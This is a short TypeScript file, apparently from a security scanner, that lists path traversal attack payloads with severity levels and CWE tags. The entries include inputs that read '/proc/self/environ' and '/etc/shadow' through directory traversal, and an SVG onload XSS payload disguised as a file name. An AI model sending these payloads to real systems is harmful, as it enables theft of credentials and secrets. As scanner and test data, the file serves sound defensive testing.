import { SeverityLevel } from '../../severity-level.js';
import { AttackPayload } from '../attack-payload.js';

export const PATH_TRAVERSAL: AttackPayload[] = [
    {
        severity: SeverityLevel.MEDIUM,
        messages: [`Extracting environment using dedicated process file`],
        payload: '/proc/self/environ',
        tags: ['path-traversal', 'lfi'],
        cwe: [35]
    },
    {
        severity: SeverityLevel.HIGH,
        messages: [`Extracting Linux hashed credentials in shadow file`],
        payload: '../../../../../../etc/shadow',
        tags: ['path-traversal', 'lfi'],
        cwe: [35]
    },
    {
        severity: SeverityLevel.LOW,
        messages: ['XSS attempt through file name'],
        payload: `<svg onload=alert(1)>.png`,
        tags: ['path', 'xss'],
        cwe: [79]
    }
];
